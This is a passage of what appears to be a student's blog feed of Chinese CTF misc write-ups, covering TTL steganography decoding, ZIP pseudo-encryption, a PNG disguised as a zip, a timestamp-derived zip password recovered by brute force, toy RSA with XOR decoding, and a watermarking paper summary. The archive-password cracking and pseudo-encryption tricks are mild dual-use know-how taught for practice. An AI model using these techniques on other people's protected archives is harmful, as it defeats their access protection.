class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#拿到一个长成这样的文件，里面是意义不明的数字</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">255</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">255</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">255</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">255</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">255</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">63</span><br><span class="line">255</span><br><span class="line">63</span><br><span class="line">127</span><br><span class="line">63</span><br><span class="line">255</span><br><span class="line">63</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>转换为2进制，并设置为8位数的2进制，就会有很神奇的事情发生</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;C:/Users/brighten/Desktop/attachment.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        num=int(line)</span><br><span class="line">        ss=bin(num)</span><br><span class="line">        while len(ss)&amp;lt;10:</span><br><span class="line">            ss=ss[:2]+&#x27;0&#x27;+ss[2:]</span><br><span class="line">        print(ss)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可能和上面的对不上，但是意思是这个意思。</p><p>后面的6位数是一样的，全是<strong>111111</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0b00111111</span><br><span class="line">0b11111111</span><br><span class="line">0b01111111</span><br><span class="line">0b01111111</span><br><span class="line">0b00111111</span><br><span class="line">0b11111111</span><br><span class="line">0b00111111</span><br><span class="line">0b00111111</span><br><span class="line">0b00111111</span><br><span class="line">0b11111111</span><br><span class="line">0b01111111</span><br><span class="line">0b00111111</span><br><span class="line">0b01111111</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么现在学习到了一个新的加密方法，就是所谓的TTL隐写。</p><p>抄一段百度</p><blockquote></blockquote><p>TTL是 Time To Live的缩写，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。TTL是IPv4报头的一个8<br> bit字段。注意：TTL与DNS<br> TTL有区别。二者都是生存时间，前者指ICMP包的转发次数（跳数），后者指域名解析信息在DNS中的存在时间。</p><p>IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1。<br> 这个东西是用来防止数据过多的。计算机网络知识。</p><p>大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。<br> 所以加密的方法就是把一个ASCII码分4截，分到4个TTL里面，有点像是最低位像素的隐写。</p><p><img alt="须传送H字符，只需把H字符换成二进制，每两位为一组。" src="https://img-blog.csdnimg.cn/20210420183610400.png"><br> 像是这个逗号，在这个隐写下就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00111111</span><br><span class="line">10111111</span><br><span class="line">11111111</span><br><span class="line">00111111</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">count = 0</span><br><span class="line">str=&quot;&quot;</span><br><span class="line">with open(&#x27;C:/Users/brighten/Desktop/attachment.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        num = int(line)</span><br><span class="line">        ss = bin(num)</span><br><span class="line">        while len(ss) &amp;lt; 10:</span><br><span class="line">            ss = ss[:2] + &#x27;0&#x27; + ss[2:]</span><br><span class="line">        #print(ss)</span><br><span class="line">        str=str+ss[2:4]</span><br><span class="line">        count += 1</span><br><span class="line">        if count == 4:</span><br><span class="line">            count = 0</span><br><span class="line">            sum=0</span><br><span class="line">            #print(str)</span><br><span class="line">            for i in range(len(str)):</span><br><span class="line">                if str[i]==&#x27;1&#x27;:</span><br><span class="line">                    sum=sum*2+1</span><br><span class="line">                else:</span><br><span class="line">                    sum=sum*2</span><br><span class="line">            # print(sum)</span><br><span class="line">            print(chr(sum),end=&quot;&quot;)</span><br><span class="line">            str=&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解码程序如上<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210420185106135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 解出来这个应该是应该zip压缩包吧。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP伪加密判定方法</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%88%A4%E5%AE%9A%E6%96%B9%E6%B3%95/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%88%A4%E5%AE%9A%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  ZIP伪加密判定方法</p><h1 id="ZIP伪加密判定方法"><a href="#ZIP伪加密判定方法" class="headerlink" title="ZIP伪加密判定方法"></a>ZIP伪加密判定方法</h1><blockquote></blockquote><p>转自 <a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UnseenCode- Invisible On-screen Barcode with Image-based Extraction论文阅读</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20UnseenCode-%20Invisible%20On-screen%20Barcode%20with%20Image-based%20Extraction%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20UnseenCode-%20Invisible%20On-screen%20Barcode%20with%20Image-based%20Extraction%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  UnseenCode: Invisible On-screen Barcode with Image-based Extraction论文阅读</p><h1 id="UnseenCode-Invisible-On-screen-Barcode-with-Image-based-Extraction论文阅读"><a href="#UnseenCode-Invisible-On-screen-Barcode-with-Image-based-Extraction论文阅读" class="headerlink" title="UnseenCode: Invisible On-screen Barcode with Image-based Extraction论文阅读"></a>UnseenCode: Invisible On-screen Barcode with Image-based Extraction论文阅读</h1><p><s>突然觉得这些做screen水印的人路子很野</s></p><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>这篇文章是2019年IEEE上发表的文章，使用的是时域水印，完全的图像处理方法，没有设计网络。之后的2021年的文章TERA: Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability相当于给它做了优化。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/41616480c8e54c6d9a8012f535ff8540.png"></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/955d2f78d18444a29444e2c9630fbd7a.png"><br> 该水印的不可见思路还是通用的时域水印思路，人眼视觉的融合措施，如上图1所示。叫做Grassmann’s law of color matching。</p><blockquote></blockquote><p>flicker fusion effect：当光强度波动足够快时，人的眼睛只感知平均强度，而不是闪烁。</p><h2 id="水印嵌入"><a href="#水印嵌入" class="headerlink" title="水印嵌入"></a>水印嵌入</h2><p>先将cover转换为CIE XYZ颜色通道。个人认为主要是为了提取步骤，在RGB空间使用该水印将会导致出现严重偏色问题。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/59309efa431e49a5896fb4215f079b99.png"><br> 颜色转换如公式8所示<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/14ec394e098d4b10a7ab4d0bccb4b731.png"></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9e1e01c07f4a4ec98bc176f34945e56e.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cd2168ecd3194a9c99b84c5ce49eb107.png"></p><h2 id="水印编码方式"><a href="#水印编码方式" class="headerlink" title="水印编码方式"></a>水印编码方式</h2><p>此处添加的水印是正反斜杠，每个块表示一个bit，由于改动较大，可以认为具有抗屏幕拍摄的鲁棒性。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/198bc79e022844f8acf272be485fddc9.png"></p><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8ba3a35e2e8e4cc6846785f18993b490.png"><br> 在较高刷新率下，依次显示b,c，可以使得人眼不可见。</p><h2 id="水印提取"><a href="#水印提取" class="headerlink" title="水印提取"></a>水印提取</h2><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7e5792bb93a24215a97340d9aa4f487f.png"><br> 拍照获取的图像为RGB格式，进行颜色空间转换，为CIE XYZ空间。再过一个归一化层<br> 由于水印嵌入只有设计X通道，因此，Z通道不变，且在这个颜色空间中，X,Z数值接近，可以用于表示原本的X。<br> 那么现在和原先的X都已经获取，即可获得嵌入的水印。（可能还有个系数）<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d1a5e18736d84d0a84630807fc39564e.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7bfba7178db2471fa49d30408b1810e4.png"></p><blockquote></blockquote><p>一个彩色图像的X分量用于嵌入，但不使用另一个彩色分量Z。我们发现了从彩色图像的交叉成分相关性中去除背景的可能性。对于一个彩色图像，在不同的彩色成分之间通常有很高的相关性。因此，我们可以假设两个分量之间的归一化像素值几乎相同，即X0≈z0。跨分量相关已被有效地用于图像恢复[14][15]。</p><p>经过公式13的L1距离拟合之后，即可判断嵌入的信息。不过在上面的展示图来看，已经可以通过肉眼分辨比特位了。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/52ad5613c51344fcb8f525944c0d9056.png"></p><h2 id="图像扰动层"><a href="#图像扰动层" class="headerlink" title="图像扰动层"></a>图像扰动层</h2><p>由于全部为图像处理方法，没有图像扰动</p>]]></content>
      
      
      <categories>
          
          <category> 水印 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 论文，水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你猜我是个啥</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BBJDCTF2020%5D%E4%BD%A0%E7%8C%9C%E6%88%91%E6%98%AF%E4%B8%AA%E5%95%A5/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BBJDCTF2020%5D%E4%BD%A0%E7%8C%9C%E6%88%91%E6%98%AF%E4%B8%AA%E5%95%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [BJDCTF2020]你猜我是个啥</p><h1 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h1><p>下载文件，发现这个zip文件打不开，这就很奇怪了，肯定是某个人直接把后缀改了，像我就经常那么干。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326162942103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 那么大一个<strong>PNG</strong><br> 所以这是一个png文件。</p><p>改后缀，发现是一个QR-CODE。<br> <img alt="二维码" src="https://img-blog.csdnimg.cn/20210326163141738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 但似乎flag 还不在这里</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210326163358881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 好吧，结果是一个水题。</p><p>结果好像是直接打开WINHEX就可以看到flag。<br> 水文+1</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip  计算机内置时钟计算</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BGUET-CTF2019%5Dzip%20%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E7%BD%AE%E6%97%B6%E9%92%9F%E8%AE%A1%E7%AE%97/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BGUET-CTF2019%5Dzip%20%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E7%BD%AE%E6%97%B6%E9%92%9F%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [GUET-CTF2019]zip  计算机内置时钟计算</p><h1 id="GUET-CTF2019-zip-计算机内置时钟计算"><a href="#GUET-CTF2019-zip-计算机内置时钟计算" class="headerlink" title="[GUET-CTF2019]zip  计算机内置时钟计算"></a>[GUET-CTF2019]zip  计算机内置时钟计算</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404195623784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 先拿一个222.zip</p><blockquote></blockquote><p>这个没有任何的提示，那么就是4或者是6位数的数字，要么就是伪加密。这个是约定俗成的事情。</p><p>一定不要4位数试完之后就躺平了。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404200500579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这个是真的加密。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404200542830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 下一个压缩包里面的是伪加密。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404200713929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>上面是00 ；下面是09</p><p>那么把09改为00就是了。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404200805210.png"><br> 拿到了一个脚本和一个压缩包。</p><p>这个脚本运行了之后没有什么反应。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#</span><br><span class="line">zip -e --password=`python -c &quot;print(__import__(&#x27;time&#x27;).time())&quot;` flag.zip flag</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个应该是一个zip文件加密指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;print(__import__(&#x27;time&#x27;).time())&quot;`</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个是输出关于时间的某个东西的感觉。</p><p>用python2 运行。</p><blockquote></blockquote><p><strong>这个时间，这个神秘数字串，传说是从某个神秘事件点到现在的秒数的计时。记不清楚了，估计是冯.诺伊曼他老人家做的。</strong></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404201122475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">反正就是那么12位数字去爆破。</p><p>全部去爆的话也就是那么10^12次的计算量。</p><p>就有一点想不明白，为什么在本地运行这个setup.sh脚本，它的密码不会重制。还是说已经加密过的文件不会重新加密吗。好像很有道理。这个就和这个函数是怎么写的有关了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip -e --password=`python -c &quot;print(__import__(&#x27;time&#x27;).time())&quot;` flag.zip flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过从常识来讲，出题的时间和现在不会差的太多。现在是161******打头的12位数字。<br> 那么，保守估计，这个时钟从诞生开始也不过是50年多一点。</p><p>10^8&#x2F;60&#x2F;60&#x2F;24&#x2F;365&#x3D;<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404202520464.png"></p><blockquote></blockquote><p>改动161*************这个开头的条件是距今3个多月吧，就是(10^7秒)去换算成月。<br>我觉得这个已经挺保守了，但是去爆破发现不行。<br>就挺尴尬的。看起来这个题目还挺老的。</p><p>只好去拿15**************头去爆破了。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404203209444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404203129926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404204105430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 拿到了flag</p><hr><hr><p>出于好奇去计算一下出题的时间，<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404203402932.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210404203537986.png"><br> 大概距今有那么2年。688天之前吧。<br> 好的，那么我们就得到了这个题目的出题时间了。这个日期是可以精确到秒之后两位数字的。<s>（立马去社会工程他）</s></p><blockquote></blockquote><p><s>（我到底为什么要算这个）</s></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚假的压缩包 1</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BGUET-CTF2019%5D%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85%201%20%20%E5%BE%97%E5%88%B0%E7%9A%84%20flag%20%E8%AF%B7%E5%8C%85%E4%B8%8A%20flag%7B%7D%20%E6%8F%90%E4%BA%A4%E3%80%82/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%5BGUET-CTF2019%5D%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85%201%20%20%E5%BE%97%E5%88%B0%E7%9A%84%20flag%20%E8%AF%B7%E5%8C%85%E4%B8%8A%20flag%7B%7D%20%E6%8F%90%E4%BA%A4%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  [GUET-CTF2019]虚假的压缩包 1  得到的 flag 请包上 flag{} 提交。</p><h1 id="GUET-CTF2019-虚假的压缩包-1-得到的-flag-请包上-flag-提交。"><a href="#GUET-CTF2019-虚假的压缩包-1-得到的-flag-请包上-flag-提交。" class="headerlink" title="[GUET-CTF2019]虚假的压缩包 1  得到的 flag 请包上 flag{} 提交。"></a>[GUET-CTF2019]虚假的压缩包 1  得到的 flag 请包上 flag{} 提交。</h1><p>拿到压缩包</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403092620839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 里面还有俩。<br> 这个压缩软件就很神奇。<br> 如果用360压缩，这个虚假的压缩包就可以直接打开。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403092821421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>但是用winrar ，就会显示加密。这个加密实际上就是一个zip伪加密，也是简单的。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403092750439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><blockquote></blockquote><p>可能是360压缩把一些错误信息给过滤掉了。像是一些文件头错误，360压缩是直接不给显示错误文件的。但是其它的解压软件是显示但打不开。</p><p>这是虚假的压缩包里面的内容。看着像是某个加密算法。估计是RSA。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数学题</span><br><span class="line">n = 33</span><br><span class="line">e = 3</span><br><span class="line">解26</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">答案是</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个整数的数量级很小，直接就可以算出来。也不乐意去求p,q了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=26</span><br><span class="line">n=33</span><br><span class="line">e=3</span><br><span class="line"></span><br><span class="line">c=pow(m,e,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="密码是" src="https://img-blog.csdnimg.cn/20210403093709854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 那么解压密码就是”<strong>答案是5</strong>“</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403093822307.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403093852798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 调整图像的大小</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403093921619.png"><br> 和谁做^5操作呢。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403094856896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>这个就很像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">f1 = open(&#x27;C:\\Users\\brighten\\Desktop\\亦真亦假&#x27;,&#x27;r&#x27;)</span><br><span class="line">xor_data = f1.read()</span><br><span class="line">f1.close()</span><br><span class="line">dec_data = &quot;&quot;</span><br><span class="line">for i in xor_data:</span><br><span class="line">    tmp = int(i,16) ^ 5</span><br><span class="line">    dec_data += hex(tmp)[2:]</span><br><span class="line"></span><br><span class="line">print(dec_data)</span><br><span class="line">f2 = open(&#x27;./data.txt&#x27;,&#x27;wb&#x27;)</span><br><span class="line">f2.write(base64.b16decode(dec_data.upper()))</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>出现了乱码<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403095246600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 但是这个PK很可以。<br> 保存到zip格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">f1 = open(&#x27;C:\\Users\\brighten\\Desktop\\亦真亦假&#x27;,&#x27;r&#x27;)</span><br><span class="line">xor_data = f1.read()</span><br><span class="line">f1.close()</span><br><span class="line">dec_data = &quot;&quot;</span><br><span class="line">for i in xor_data:</span><br><span class="line">    tmp = int(i,16) ^ 5</span><br><span class="line">    dec_data += hex(tmp)[2:]</span><br><span class="line"></span><br><span class="line">print(dec_data)</span><br><span class="line">f2 = open(&#x27;./data.zip&#x27;,&#x27;wb&#x27;)</span><br><span class="line">f2.write(base64.b16decode(dec_data.upper()))</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210403095414725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这个又是<strong>word</strong>的感觉吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 